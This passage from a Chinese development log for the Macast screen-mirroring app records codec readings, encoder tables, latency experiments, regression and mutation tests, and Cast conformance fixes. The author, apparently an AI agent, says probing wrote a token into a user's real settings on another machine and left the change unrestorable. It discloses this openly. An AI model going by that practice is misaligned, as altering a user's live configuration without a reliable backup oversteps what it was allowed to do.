前三字节），`live_codecs()` 把它交给**三个读者**（页面 `addSourceBuffer`、浮层「H.264 Profile」、卡片 `H.264 Profile` 行；后两处读 `/browser/stats` 的**扁平** live dict）。`MSE_VIDEO_CODEC_DEFAULT = avc1.640028` 降级为**兜底**，因为它只在"VT + 1080p + 不钉 level"这一种形状下才是对的；八行实测（x264 那几行在 macOS 与 Windows 两台机器上各跑一遍、逐字相同；NVENC 那两行是 2026-10-03 在 .68 上第一次读到的）：x264 1080p `avc1.42c028`（3M 与 6M 都是）、720p `avc1.42c01f`、2160p `avc1.42c033`，VT `-level 42` `avc1.64002a`、VT 2160p `avc1.640033`、VT 1080p 不钉 `avc1.640028`，NVENC 1080p `avc1.640028`（SPS `67640028…`）、NVENC 2160p `avc1.640033`（SPS `67640033…`）。**NVENC 那一对是这句论证最锋利的形状**：同一个编码器、同一条 argv 形状、从不钉 level，画面从 1080p 换到 2160p 字符串就跟着变 —— 所以兜底值连"按平台写死"都不能变成，它在 1080p 撞上 NVENC 纯属巧合。**x264 被告诉 `baseline` 之后交的仍然是 `avc1.42c028`**（约束特征位与 level 由编码器自己定，而 NVENC 老老实实写 `0x64` = High），所以那句"这一路是 High profile"以前是文档说的、现在是线上读的。webrtc / DLNA 字节日志形状答 `''`（没有 fMP4 `moov` 可解 —— 这一路根本不报 profile，而不是报一个猜的）。**④ 硬件编码器是一张平台表**：`HARDWARE_ENCODERS = {darwin: h264_videotoolbox, win32: h264_nvenc}`（Linux **故意不在表里**），`hardware_encoder()` / `uses_nvenc()` / `encoder_pix_fmt()`（win32 硬件 = nv12）/ `encoder_switch_label()`（开关文案 macOS「VideoToolbox 硬件编码」/ Windows「NVENC 硬件编码」，setting.html 读 `mirror_state.capture.hardware_label`，字面量已删）。**Windows 的能力判定必须真的编半秒**（`_encoder_opens()`，`testsrc=size=640x360:rate=24` × 0.5 秒、真 pixel format、真容器），因为那台机器 `-encoders` 同时列 nvenc / qsv / amf 而 **qsv 连会话都开**（`Error creating a MFX session: -9`、非零退出、零字节）—— 清单说的是"符号在二进制里"，不说"驱动在机器上"；macOS 保留清单问法（VideoToolbox 是 OS 框架不是驱动），分支是 `has_hardware_encoder()` 里那句 `if name and key[1] == 'darwin':`。nvenc argv：`-preset p1 -tune ll -rc vbr -profile:v <p>`，**没有** `-level`、**没有** `-realtime`（那是 VT 的 AVOption，写给它同 `-tuned` 那一族错误）；`-tuned ll` 与 `-preset ll` 都被实测否掉（前者零字节，后者已弃用）。**`VT_BITRATE_MULT = 1.5` 只对 VideoToolbox 生效**（`rate_target()` 问 `uses_videotoolbox`）：只有它少给三成（要 4 Mbps 实发 2802 kbit），nvenc 被要求落在档位数字上且**量过落在**（档位 6000 → 线上 6052 / 6081 / 6087 / 6029），x264 同。在线成本：同一条真桌面采集 **x264 0.44 核 vs h264_nvenc 0.21 核**。**一处自我证伪要留着**：先前把这条链路读成"媒体时钟只有墙钟的 0.80 倍"，用片内时间戳重量是 **0.983–0.985、播放速度 1.00x** —— **0.80 是我探针自己的墙钟计时假象**（它把 HTTP 分块到达间隔当成媒体时长），不是 Windows 的锅；这条同时纠正 §4.8 上面 v0.22 段那句"跨机器未验"的诚实边界（见本段第一句）。回归用例：**Part 22**（fourcc 八行实测（六行 macOS/Windows 的 x264+VT，加 2026-10-03 读到的 NVENC 两行；钉住"兜底值只在这八行里的两行上成立"用的是 `count(...) == 2` 而不是 `== 1`，NVENC 2160p 那一行专门用来证明"同编码器换画面就换字符串"） + 畸形 box 的两种拒法（`len(body) >= 4` 与 configurationVersion==1；**曾有第三条 `size >= 12` 被证明是死代码**：声明尺寸小于 12 时切出来的 body 本来就短于 4 字节，两个问题对 0…2³¹ 每一个尺寸同答，所以删掉并把 docstring 改成"决定成败的就是这两问"）+ 三平台编码器表 + Windows 走真编码探测（假 ffmpeg 的 argv 里**不许**出现 `-encoders`）+ `rate_target` / `encoder_pix_fmt` / `encoder_switch_label` 各自钉住）、**Part 32**（preflight 的 codec 提问表按平台分：`HARDWARE_FLAG_PLATFORM` 里 `h264_nvenc → win32`，且 nvenc 那一句必须说"清单不等于驱动，镜像启动前还会真编一帧"）、**Part 54**（Windows 的 `_capture_state()['hardware_label'] == 'NVENC 硬件编码'`）、**Part 56**（webrtc 的 `page_stats` / `stats()` 键集含 `codec` 且值为 `''`）。十个定点变异体各自变红 2/1/3/3/3/2/2/1/1/1 条（M1 configurationVersion 不查 2：两条畸形 box 的拒法；M2 body 不夹界 1：IndexError 落进"这一条形状播得起来"那句；M3 `live_codecs` 无视读到的 fourcc 3：喂给浏览器的那串 / 服务出去的页面里的 CODECS / 一次正常会话；M4 nvenc 分支删掉 3：三平台表 / nvenc argv / 被否掉的那两个写法没人再拒；M5 darwin 分支被无视 3：Windows 的真编半秒那一问在三条各自路径上都被跳过；M6 `rate_target` 对所有硬件乘 1.5 2：1.5 倍不许走到 nvenc / 只有 VT 该被抬高；M7 两个开关标签都写 VideoToolbox 2：文案按机器分 / 页面说出本机那个编码器；M8 卡片少一行 profile 1：卡片与浮层必须出自同一次读取；M9 浮层那行无条件显示 1：读不到 profile 时那行不许出现；M10 selfcheck 的 nvenc 行删掉 1：preflight 要问每一个平台专属 codec），全部跑完整套件，最后一个从 /tmp 备份还原、md5 逐字节校验（**绝不用 git restore**），还原后整跑 **1963/1969**、Part 34 之外 0 红。**v0.24：一次电视镜像的最大时长（`Mirror_Max_Duration`）**（2026-10-03，用户提的「加一个投屏最大时长」）：三档 `MAX_DURATION_HOURS = (12, 24, 48)`、默认 12、**故意没有「不限」这一档** —— 这一页的默认值从来没人去动，而"没人动就等于不设限"正是这个旋钮要结束的那个状态。**只管 `MAX_DURATION_TARGETS = ('cast', 'dlna')`**：`browser` 的延迟归 `Mirror_Live_Edge` 那个旋钮管、刷新一次观看页就重新开始，一次观看的长度不是这里该管的；`webrtc` 与 `caststream` 被截断的话，用户读到的是"电视上画面突然黑掉"，而那条路本来就没有"播完"的概念。**一个真值点**：ffmpeg 的输出 `-t` 与「伪装成文件」那对 `size=`/`duration=` 都由 `bound_video_seconds()` 算，上限只许**缩短**这对数字、不许拉长（`advertised_file()` 先被 `DLNA_MAX_ADVERTISED_SIZE`（1.9 GB，§4.8 上面那条有符号 32 位红线）卡住 —— 2026-10-03 实测：五档在各自默认档位码率下先把长度卡在 **41–54 分钟**，12/24/48 三档的 `size` 一个字节都不变，所以这个上限是给"哪天有人把档位码率调小"准备的保险，**不是今天生效的规则**）。**到点是主动停止 + 点名旋钮的通知**（`_duration_expired`：先增 generation 再 `_teardown()`，pump 的死亡上报因此闭嘴，休眠断言一起释放；用 `_teardown` 而不是 `_fail` —— 这是一次计划内的结束，不是故障，而页面读到"未镜像"才是诚实的答案）。**不单独依赖 ffmpeg 自杀**：会话自己有定时器，且"我们的定时器总是先到"是**假话** —— DLNA 预填 + LOAD 往返能让 `-t` 真的先到，那一格由 `_encoder_died` 的 cap 分支回答（进程退出码 0 + "已到点"的形状 ⇒ 同一句话，不是"采集中断"）。**读数从 argv 里读回来**（`_session_diagnostics` 的 `'max_seconds': _int_flag(command, '-t')`）：「统计信息」卡的「最大时长」行与「画质」卡的档位按钮因此同源，而**不受约束的目标根本不出现这组按钮**（一个调不动东西的控件是谎话）。**写入侧按档位拒绝、读取侧夹住**（`set-max-duration` 对 `40`/`abc`/空值回 `code: 1` 并说明该用哪几个数 —— 页面不是唯一该执行这张表的地方，静默把 40 收成 48 会在凌晨三点让人困惑；`max_duration_hours()` 面对磁盘上的旧值/越界值才夹回默认，因为拒绝的后果是一个打不开的设置页）。帮助弹层里那句「另外三件不算 bug 的事」与 `MAX_DURATION_HINT` 必须说同一套话（哪几路受约束、停止是主动的），但**页面上不写档位数字也不写「小时」**（Part 57 有一条 `'小时' not in page` 的用例，为的就是这张表只活在一个 tuple 里）。**v0.25：「低延迟」这句话从结构推断改成本机实测**（2026-10-03，用户批准的三件事之一：「本机用 mse_latency_probe 量一次 WebRTC lag」）：**`mse_latency_probe.py` 打不了 WebRTC**（它读 MSE 的 `buffered.end`，而 `webrtc` 形状根本没有 MSE 缓冲 —— 是一条 MediaStream track），而判定本身是**比较句**（"量不出比 browser 更好就摘掉「低延迟」"），所以必须有一台仪器同时量两边。仪器是一次性 spike（`/tmp/webrtc-lag/`，**未入库**）：无边框 `NSWindow` 在 `NSFloatingWindowLevel` 按**记录下来的墙钟时刻**刷黑/白，生产观看页里注入一个 `requestVideoFrameCallback` 采样器（rAF 不行：它按合成器自己的节奏跳，量的就不是"这一帧上屏"）把视频画进 canvas、取闪光窗落在画面里那块矩形的平均亮度、用 `Date.now()` 打戳；同一台机器同一个 epoch，两个钟之差**就是整条链**。配对是**互相关峰值**（120–1500 毫秒逐毫秒滑，±40 毫秒内计数有多少次闪光对上了），**不是按位置也不是贪心** —— 那两种先写过，分别给出 −4896 毫秒和一个自信的错误 934 毫秒。结果（VideoToolbox `avc1.64002a`、avfoundation 采集「屏幕 (无系统声音)」、1280×720、新会话、观看端走本机局域网地址而不是回环）：**webrtc p50 369（327–396）对 browser 492（465–509），两边各 16/16 次闪光相符**；另二次读数 browser 463（第二次新会话）、webrtc 325（采集换成 SCK 那一次）。**webrtc 在所有读数下都赢 ⇒ 「低延迟」保留，数字挂上去**，`MEASURED_LAG_MS = {'browser': 492, 'webrtc': 369}` 是**唯一真值点**，两张卡片（`OUTPUT_HINTS['browser'|'webrtc']`）与帮助那两个 bullet 都读它。**为什么是在 import 时 `.format()` 进字面量而不是在 `output_hint()` 里算**：Part 52 有一条 `output_hint(k) == OUTPUT_HINTS[k]`（除 `dlna` 外全等）的用例，函数里现算会把那句契约悄悄改掉。新增两条 Part 44：一个 bullet 里必须同时出现两个数、另一个只出现 browser 那个并且带着「缓冲边缘」这个限定语（**492 与 838 是同一条链的不同一段，谁把两个数当彼此的替代谁就错**，页面上现在写明了各量哪一段）。三条**读数必须一起带上**的坑：① 参考时刻取在绘制回调里、AppKit 推屏之前 ⇒ 每个数**偏高最多一帧**（24 fps 约 42 毫秒），方向已知所以比较安全；② **macOS 屏幕采集是变化门控的** —— 静止桌面上下发的每一帧都被打上 1/24 秒的戳，不管它实际何时发生，于是媒体时钟跑到墙钟的约 **0.4 倍**，凡是照着它读出来的延迟全部虚高：**同一个仪器在明白这一点之前给 browser 报过 806/1497 毫秒**，而页面 17 次闪光只上屏 7 次；对策是在被测窗口旁边常驻一个一直在闪的"忙碌窗"；③ 这些是**新会话**的数（`browser` 形状会随会话变老，上面那组虚高读数就来自二十分钟的老页面）。顺带答掉研究文档 §3.5 挂着的一条（仅本机有线这一格）：接收端抖动缓冲**不是**主要项 —— `framesReceived` 305 = `framesDecoded` 305、`framesDropped` 0、`nackCount` 0、rtt 1 毫秒、`jitterBufferDelay / jitterBufferEmittedCount` ≈ **3.5 毫秒**。**测量副产品里五条待看的现场事实（都只记录，本轮没改代码）**：① avfoundation 路径在静止桌面上的媒体时钟 ≈0.39× 墙钟，影响所有按墙钟读延迟的形状；② SCK 交出一个 nil pixel buffer 的那一次会把**正在跑的**镜像拆掉/静音，而页面继续显示「正在镜像」；③ 今天有一次全新 SCK 尝试 3 秒内没交出任何帧（同一台机器早前是好的）；④ **一次 SCK 拒绝之后整轮运行静默 `-an`**，用户读到的是"系统声音坏了"而不是"这一轮没声音"；⑤ browser 形状的延迟随会话时长增长（上面坑 ③ 那组 806/1497 毫秒的读数就是它，不是仪器坏了）。 **v0.26 取证（2026-10-03：跨机延迟 + Windows 画面饥饿的根因 —— 这一轮代码一个字节没改，只有测量与文档）**：用户批准的第三件事「等 .68 上线后补 Windows 那半边」。仪器是 §10 那一支重新指向跨机：闪光窗在 .68、采样在生产观看页（Mac），时钟靠 NTP 式对打到 .68 上的监听口（`offset = ((t1−t0)+(t2−t3))/2`，取最低 RTT 那一半的中位数，散布 <1.5 毫秒、每轮漂移约 1 毫秒；**偏移不是常数** —— 同一天四轮读出 442 → 446 → 455 → 476 毫秒，所以每轮必须重测，绝不能缓存）。两个仪器坑：① **`chrome-headless-shell` 在 31.1 秒时用退出码 0、停在 `about:blank` 自杀**（它自己的默认 `--timeout`，而开着远程调试就改不了：`Headless commands are not compatible with remote debugging`，`headless_shell.cc:204`），跨机取样一轮就是 30 秒，于是读起来像"页面死了"；换成完整 Chromium（`~/Library/Caches/ms-playwright/chromium-1234/…/Google Chrome for Testing`，45 秒后仍在）才对 —— **同一支 31 秒计时器也在切 `scripts/webrtc_page_probe.py` 的观察窗口**，那条限制现在还没写进脚本；② 旋转屏的几何里 `FLASH` 是桌面坐标（2560×1440 空间）、`SAMPLE` 是视频坐标（1280×720 线上帧），ffmpeg 的 crop 会静默钳制，所以两个数不许合并。
**webrtc 跨机 = p50 400 毫秒（371–442，15 次闪光 14 次对得上，峰值 403 毫秒），对本机 369 毫秒只差 31 毫秒**：采集 ddagrab 输出 1、编码 `h264_nvenc`、1280×720 / 4 Mbps，`presented_fps` = `decoded_fps` = 24、rVFC 取样 1152/1152 全部画出、`framesReceived` 643 = `framesDecoded` 643、丢帧 0、`packetsLost` 6、`nackCount` 68、rtt 2 毫秒、抖动缓冲实测 72 毫秒（目标 95 毫秒）；发送端同轮 `sent` 149.6 → 159.3 MB、`drops` 835 → 970（握手期按秒滚动，设计如此）、`misses` 0。**所以「低延迟」不需要跨机限定语**（多一台机器、多一跳、换一个编码器，没量出可见代价；那 31 毫秒落在仪器自身"偏高最多一帧"的偏差里）。一个**没被控制的变量留在记录里**：ICE 选到的候选是 `remote_ip 100.122.246.80`（.68 的 **Tailscale** 地址），尽管信令走 `192.168.1.68` —— rtt 2 毫秒说明没绕中继，但媒体没走局域网那个地址，所以谁要把 400 毫秒当成"纯有线数"引用，先钉死 192.168 候选重测量。
**browser 跨机没有可报的延迟数字，而且原因在我们这一侧**：同一支仪器打 `Output=browser` 得到**不可配对**的结果（相关峰 239 毫秒、15 次里 1 次对得上；第二轮 208 毫秒、同样 1/15；第三轮画面根本没起来：`readyState` 1、播放位置 0 秒、`presented_fps` 0，而 rAF 采样了 3951 次）。存档样本说的是另一件事（一次性仪器与打分脚本**没有入库**，在 `/tmp/macast-v016/`，方法是「同一方块内数亮度穿越 + 减掉每轮实测的时钟偏移再配对」，细节见研究文档 §11 末的 provenance 段）：闪光窗排了 16 次翻转，页面 30.4 秒里只产出 **10 次亮度穿越**（另一次跑 6 次），而播放器自己**一切正常**（1.004× 播放速度、落后直播边缘 0.444 秒、`written` 16.6 MB、`exchanges` 2、`drops` 0、`misses` 0、`queued` 0、`codec avc1.64001f`）—— **饿死的是画面不是网络**，所以这一格报的是采集退化，不是延迟。把每次翻转配到"下一个可用的穿越"会得到 278…3463 毫秒（p50 1712），**这句必须读成漂移而不是延迟分布**：10 次穿越服务 15 次翻转意味着 5 次闪光压根没被画出来，那些"延迟"是贪心配对的产物（与 §10 里位置配对给出的 −4896 毫秒同一类假数）。
**根因：把 dshow 回环设备读进输出，就把画面门住了。** 十二路 A/B（每路 6 秒，全部在桌面像素 (64,0) 的 32×32 方块上数**内容变化次数** —— 第一轮量的是**字节**节奏，而字节可以被 muxer 按住、画面照走，所以依赖变量必须换成画面）：`prod`（出厂形状）9 与 5（两轮）、`b50`（`-audio_buffer_size 50`）5、`minbuf` 4、`tqs`（`-thread_queue_size 1024`）4、`noasync`（去掉我们的 `aresample=async=1`）3、`noresample` 2、`maxdelta` 2、`delta40`（`-max_interleave_delta 0.04`）6、`ts`（换 MPEG-TS）8，而 **`unused`（设备照样打开、`-an` 丢掉）45、`lavaf`（第二路换成 `lavfi sine`）54、`video`（根本没有音频输入）55**。四条结论各自否掉一个"看起来能修"的地方：① 凶手是**读设备**而不是设备存在（`unused`/`lavaf` 都恢复；媒体时钟 prod 0.69× 对 `unused` 0.91×）；② **没有任何 ffmpeg 旋钮买得回来**，且 `aresample=async=1` **不是**嫌疑人（`noasync` 3 = 更差，与我出发时那个猜测正相反）；③ **容器也不是**（`delta40`/`ts` 就是第四轮的那一问，答案是不）；④ 那台机器上的发行版**没有 `wasapi` demuxer**，所以"换一条音频输入"这条直觉出路在这里不存在。`webrtc` 与 `caststream` **按构造逃开**（`screen_mirror.py:3471`：`if capture.audio_map and kind not in ('caststream', 'webrtc')` … `else -an`）——那正是健康的 `unused` 形状，所以同一台 Windows 能把 400 毫秒的 WebRTC 交给浏览器，却把每秒约 1.5 次内容变化交给 MSE。**出厂没有任何开关能拿到好形状**：`windows_loopback_device()` 只要 dshow 表命中 `WINDOWS_LOOPBACK_HINTS` 就交出设备（这台的「立体声混音 (Realtek(R) Audio)」就在表里），`_probe_windows` 于是映射 `1:a:0`；运行时那条弃声闩（`_audio_refused` / `_RetryVideoOnly`）只在带声音的会话**一帧都不产**时才触发，而 Windows 约 1.4 秒就交第一帧，所以它永远不触发；`CONSOLE_ACTIONS` 里没有声音开关。**在 Windows 声音设置里禁用「立体声混音」能治好症状，但那是用户的机器和他的音频配置，不是测试夹具，没代他点。**
**两句不许从这一节读出来的话**：① 不许拿本机的 +123 毫秒 MSE 差值去推算"健康的跨机 browser ≈520 毫秒"——那是算术不是测量，而出厂代码在 Windows 上没有任何路子能产出这个数；② browser 那一侧只有两轮单样本，第三轮跑不起来是因为 `.68` 上我的 `flash68.ps1`/`token68.ps1`/`macast_api.ps1` 在会话中途被删掉，而 `query user` 显示用户正坐在那台机器的控制台前 —— 于是停手，不再往他正在用的机器上装仪器。`.68` 的收尾状态记在 `docs/research-screen-mirroring-transport-2026-10.md` §11 末（镜像已停、`Mirror_Screen` 还原成「第一块屏幕（默认）」、四个取样 powershell 按 PID 杀掉、我建的 29 个计划任务全删，只剩不是我的 `DOpusRT_RunStd_{…}`）；**唯一还欠那台机器的一件事**是把当前 `Api_Token`（看着像探针时期写进他真实设置的值；**值不抄在这里**——在那台机器的设置页「状态 → 网页投屏入口」读，命令里从文件构造）与改动前的备份 `D:\Downloads\macast-cfg-backup-20261003-132130`（sha `f05a7098…`，6115 字节）比对并按需还原，而那份备份现在 `type` 回 rc 1 / 0 字节 —— **读不回来了**。
**2026-10-05 复看：这一格仍然欠着，而且性质更清楚了** —— 换 v0.22.0 之后他的配置 `BYTE-IDENTICAL=True`
（sha8 `6a6613a5`），也就是说里面那一位**还是我探针期写进去的那个字面值**，它不会因为升级而自愈。
既然原始备份读不回来，"按需还原"这条路已经关死：**只剩他自己在那台机器的设置页「高级设置」里换掉那一个键**，
这不是我能替他做的决定，也不该由我再写一次他的设置（§10 第一条）。
**顺带一条生产里的 fourcc**：打包版 Windows 在 720p / 4 Mbps 档从 init segment 读回 **`avc1.64001f`**（`/browser/stats` 的 `codec`，不是探针问的），于是同一个 NVENC argv 形状在 720p / 1080p / 2160p 上是 `64001f` / `640028` / `640033`；§9 那张表加了一行，而"兜底值只在其中两行上成立"仍然成立。**v0.26（2026-10-03，用户选定「只改卡片文案」，代码行为一个字节没变）**：那笔代价现在印在**「投屏方式」卡的浏览器那一行**上（`WINDOWS_BROWSER_SOUND_COST` 由 `output_hint('browser', platform=…, audio_mapped=…)` 追加；注意这张卡不叫「投屏形状」—— 预填秒数那个旋钮才在「投屏形状」上，两处别混）。出现条件是两个都得成立：**被描述的机器是 win32** 且**采集探测真的把回环设备映射进输出**（`system_audio_mapped()` 只读 `_capture_cache`，绝不在页面轮询的路上 spawn ffmpeg）；那个按目标的「带系统声音」开关被用户否掉了，所以今天的默认组合（browser + 声音开）仍然是退化形状，这一轮只是把价格写在它旁边。**两个数字读自有测量的常量**（`WINDOWS_LOOPBACK_CONTENT_HZ = 1.5` / `FPS`），**句子里不许出现「毫秒」也不许出现任何 `MEASURED_LAG_MS` 的数字** —— 跨机的 browser 形状没有可信延迟读数（§11 配不上对，≈520 毫秒是算术不是测量），编一个数字比不写更糟。**回归用例 Part 58（21 条）**：A 段问函数自己的两种形状（**无参调用必须逐字交回模块字面量**，因为 Part 52 钉着 `output_hint(k) == OUTPUT_HINTS[k]`；`1.5` 与 `24` 必须由常量算出；追加的那句里不许有毫秒；darwin / 没有回环口的机器 / 其余三个目标各自保持原句；`dlna` 的预填重算不被打断），B 段问 `system_audio_mapped()` 的三种机器状态、并要求它与 `ScreenMirrorSetting._audio_state()['capturable']` 同判，C 段是 AST 三条（`output_hint` 体内**不许读 `sys`** —— §4.8 Part 40 那条接缝教训；两个调用点必须把两个接缝都传下去；`WINDOWS_BROWSER_SOUND_COST` 的表达式必须**按名字**读 `WINDOWS_LOOPBACK_CONTENT_HZ`，且不许把 `1.5` 或 `24` 再抄一遍字面量），最后真的 `_load` 一份 `mirror_view` 把 `console_state()` 打一遍（`find_ffmpeg`/`start_search`/`start_renderer_search` 打桩），要求页面渲染那一列（`row[6]`）收到这句话、且**只**在 browser 行出现。追加的句子一律用**减法**从整行里切出来，用例不复抄任何散文。**四个定点变异体各自变红 3/1/2/1 条**（A 调用点丢掉两个接缝 ⇒ 3 条：调用点契约 + 通道行 + `mirror_view` 转发；B 把作用域扩到 darwin ⇒ 1 条；C 删掉 `and audio_mapped` ⇒ 2 条；D 把常量换成手抄的 `1.5` ⇒ **只有 C 段那条 AST 用例抓得到**，1 条 —— 这条是这一 Part 存在的理由：**渲染出来的字符串证明不了绑定**，手抄的 1.5 印出一模一样的字，而 §11 重量那天它就是错的，即 §4.8 那句「提示比代码活得久」的失败形状）。基线 2033/2039，红的仍是 §4.12 那 6 条 Part 34；四个变异体各自跑完整套件、还原后 md5 逐字节一致（`65c00bce…` → 版本号提交前的基线）。 |

回归用例：Part 14（外部播放器 / 小窗 / yt-dlp 两种模式）、Part 15（钩子）、
Part 16（中继对打 Macast 自己的 Chromecast 接收端）、Part 17（RAOP 监督）、
Part 21（屏幕镜像：假 ffmpeg + 自家 Cast 接收端对打，真 HTTP 实时流；v0.3 的一键
BlackHole 路径全部打桩——CoreAudio/下载/安装器都不被触碰，纯测编排与降级）、
**Part 22（v0.4：两种封装、重播不对称、每会话凭据、播放页、采集预设与菜单）**、
**Part 23（v0.5：伪装成文件的字节账本 + 真 HTTP 语义（HEAD/206/恰好 n 字节/416/重连同偏移）、
SSDP 发现与设备描述、SOAP 发送序列（喂给自家接收端校验）、档位回退与看门狗、端到端镜像与菜单）**、
**Part 24（v0.6：Cast Streaming —— AES 与 `/usr/bin/openssl` 逐字节对齐、19 字节头与切片、
RTCP 读法、多 slice 访问单元，以及对打到真 TLS + 真 UDP 的自家假设备：握手、在途窗口、
checkpoint 解锁、PLI、**NACK 补发（换序号、payload 逐字节相同、线上无重复序号、
修复缓冲挤出与 staleness 各自计入哪个计数器）**、回落 LOAD、teardown 顺序）**、
**Part 25（本地文件投屏 v0.1：ffprobe 决策表逐条（含理由文案）、stdlib Range/206 服务的真 HTTP
语义（200 不带 `Content-Range`、HEAD、206、416、消失的文件）、会增长的转码文件与其长度/码率
回退、自家假 Cast 设备上的 LOAD/媒体账本/`QUIT_APP`（含接收端侧 ledger 被清）、DLNA 侧
`SetAVTransportURI` + 断点 `Seek` + SOAP 的 UTF-8 长度、播放列表自动连播、抢占看门狗的重试预算
与认输、音轨/字幕选择与 sidecar WebVTT、avfoundation 真实设备表、菜单与页脚）**、
**Part 27（按模块独立日志：claim 路由/去重复/幂等、记录只落一处、log-modules/log/log-download/
clear-log 的 module= 面与门控、每次启动清空）**、
**Part 28（模块设置面板：分组与中文标签、无枚举插件的空卡片、set-value 的类型与归属校验、
以及四条"标签表没有和仓库漂移"的守卫用例）**、
**Part 29（屏幕镜像 v0.7+v0.9 一键设置：步骤机不回退/跳过不进分母/fail 压过晚到的 leave、五态判定
逐条排优先级（capturable > loaded > on-disk > stale-receipt > absent，含"见证者抛异常不许往上冒"）、
四条安装分支各指名其步（健康机跳过、残留记录重装、密码取消如实报），外加 v0.9 那两条**反循环**断言：
"盘上有驱动"这一支必须**既不下 pkg 也不 `open`**（meta/download/verify/install/wait 全是 skipped，
note 里不许出现"重启一次"当第一答案），"CoreAudio 有 / ffmpeg 没有"这一支**不重装也不重载**、
照样建聚合设备、结尾必须说"麦克风"并且 `probe` 是 fail 而不是一个绿色的收尾；
另有 `_wait_for_blackhole` 必须回答"哪个见证者看见了"（`loaded` 不等于成功）、
`_SetupProgress` 的进度归属按调用方给的 step 走、sha 不匹配不开安装器、
崩溃只 fail 在跑的那一步、cask API 兜底带来源标签、pkgutil/HAL glob 两个探针分开问、osascript 重载
走管理员授权、进度页真 HTTP 凭据（对 token 200、错/缺 403、nosniff/no-store、不含管理令牌）、
worker 收尾（finish→busy 清→页面限期保留）、`.app` 的 plist 必须声明 `NSMicrophoneUsageDescription`）**、
**Part 26（AirPlay 镜像接收：rc 文件的引号/消毒/「用户附加项排在末尾所以能覆盖」/值不带前导 `-`、
`log_event` 整张表含两种断开拼写与"chatter 不算事件"、POSIX 上 `os.isatty(read_fd)` 证明挂的是 pty、
PATH 上放假 uxplay 走完 启动→连接→断开→停止→reload 全生命周期（断言 argv 只有 `-rc`、没有 `-p`、
`$UXPLAYRC` 全程为空、用户的 `~/.uxplayrc` 前后逐字节不变）、找不到二进制时的编译配方、
自己退出时上报最后一条 error、被替换的实例的 reader 保持沉默、与内置 AirPlay 接收端共存只提示一次）**、
**Part 35（镜像控制台搬进设置页：页面读的 HTTP 端点、`macast/mirror_view.py` 里"显示什么"的派生规则、
页面与后端共享的拼写 —— 三者各在**决定它的那一处**测；页面里没有可调用的 Python，所以它那半份契约按文本测）**、
**Part 36（菜单栏自己的内容：删 Tk 控制台曾把 `build_app_menu()` 换成 `[]`，状态栏图标于是**根本没有菜单**，
而在此之前没有任何用例构造过它 —— 现在建真的顶层并说出该有什么：服务开关、播放行、打开设置页、重投历史，
以及"不许出现电脑投屏行"这条用户裁定）**、
**Part 37（实时链路自己的算术：队列能含多少流、丢弃允许切在哪、电视在拿到 URL 前被喂多久的空、
没动过设置的安装选哪个编码器 —— 2026-09-23 那三条"延迟大/有杂音/不开硬件编码看不见"全是这一文件里的数字与位置，
所以在这里量，不去辩论）**、
**Part 38（采集开了却一帧不回的这一格：噪声过滤、"没有返回画面"的每一格必须给出门和重启、
弃掉音频口的两种采集形状（avfoundation 改 `screen:none` 且不动缓存的探测、pulse 整口删掉而不碰
`:0+0,0`）、对打到真 HTTP 的"降级成功"与"彻底失败"两条路径，以及**页面上那句话**（会话自己的
`audio_dropped()` 优先于探测缓存：弃声时「系统声音」行不再说「已启用」，状态行挂上标记））**。
测试用的是假二进制（PATH 上放个 shell 脚本），所以跑测试不需要 yt-dlp / VLC / shairport-sync / ffmpeg / uxplay。

### 4.9 Cast 接收端一致性：打桩测试永远抓不到的那一类

这一族问题的共同点是**我们没有崩、日志也没有 ERROR，只是发送端不认账**。
`verify_cast_airplay.py` 把网络全部打桩，`vlc_sender_sim.py` 只复刻 VLC 的状态机，
所以两者都抓不到；能抓到的是 `scripts/cast_conformance.py`（跑真实 pychromecast 栈）。
举证时的 pychromecast 版本是 **14.0.10**（就在本仓库 `.venv` 里）。

| 症状 | 真因 | 修复要点 / 用例 |
|---|---|---|
| 发送端调音量**卡 10 秒然后抛 `RequestTimeout`**（HA 音量条、mkchromecast 音量键） | `SET_VOLUME` 只改播放器，**从不回复** `RECEIVER_STATUS`；pychromecast 的 `ReceiverController.set_volume()` 在 `WaitResponse(REQUEST_TIMEOUT=10.0)` 里等这条回复才返回 | `_on_receiver` 的 `SET_VOLUME` 改完状态后 `_send_receiver_status(sock, src, requestId)`。Part 18 前 4 条 |
| 音量条永远 100%、静音状态读不到 | `RECEIVER_STATUS.volume` 与 `MEDIA_STATUS.volume` 都硬编码 `{"level":1.0,"muted":False}`；发送端按**我们报的值** ±0.1 算下一档 | 存 `_volume`/`_muted`，两处 status 都回真值 |
| mkchromecast 的 `--hijack` **每 5 秒重投一次** | `applications[].displayName` 回了 `"Macast"`，而真机对 `CC1AD845` 一律回 `"Default Media Receiver"`，发送端把别的名字当成"接收端被抢了" | `DEFAULT_MEDIA_APP_NAME` |
| 播完了手机还一直显示"正在播放" | `GET_STATUS` 只要有 media 描述就回 `PLAYING`，**永不**降级 | `set_state_*` 观测 + `_observed_state()`；结束带 `idleReason`（FINISHED / ERROR / CANCELLED） |
| 刚 LOAD 完就把新视频判成 `CANCELLED` | LOAD 换片之后 mpv 才补发**旧文件**的 `end-file reason=stop` | `_note_stopped` 只采信"当前媒体已经报过播放"的终止事件；ERROR 例外（换片只会以 stop 结束） |
| mDNS 不可用时发送端**认不出** Macast | `ssdp_udn` 带了 `"uuid:"` 前缀，而 pychromecast 用 `UUID(udn.replace("-",""))` 解析、**整个 `device_info` 返回 None** | `_eureka_info` 发裸 UUID |
| 每次发现都多一次失败请求 | `capabilities` 里缺 `multizone_supported`，而 pychromecast 在 `device_info` 存在时缺省为 **True** → 去探 `https://host:8443/...?params=multizone` | 显式 `multizone_supported: false` |

两个记录下来的操作细节：

- **`Chromecast.set_volume` 在 pychromecast 14 里不存在**（`volume_up()` 自己调用它会
  AttributeError，是上游的 bug）。要复现接收端音量路径，得用
  `cast.socket_client.receiver_controller.set_volume(...)`——那才是走 `WaitResponse` 的那条。
- **本机跑真机验证不要碰用户配置**（§10）：`SETTING_DIR` 是 import 时由 appdirs 算出来的常量，
  所以在 `import macast` **之前**把 `appdirs.user_config_dir` 指向临时目录，日志和设置
  就都落在临时目录里了。示例见本轮验证用的 `/tmp/macast_tempconf.py` 那种写法。
  **同一招在 Windows 上必须原样用**（2026-10-03 在 .68 上读 appdirs 1.4.4 源码定性）：
  那里的配置目录是 `SHGetFolderPathW(None, CSIDL_LOCAL_APPDATA=28, …)` 问 shell 要回来的，
  也就是读注册表 —— **`set APPDATA=` / `set LOCALAPPDATA=` 都改变不了它**（`macast/utils.py:34`
  又在 import 时把这个结果冻成常量）。想隔离实例只能在启动脚本里、`import macast` 之前打桩
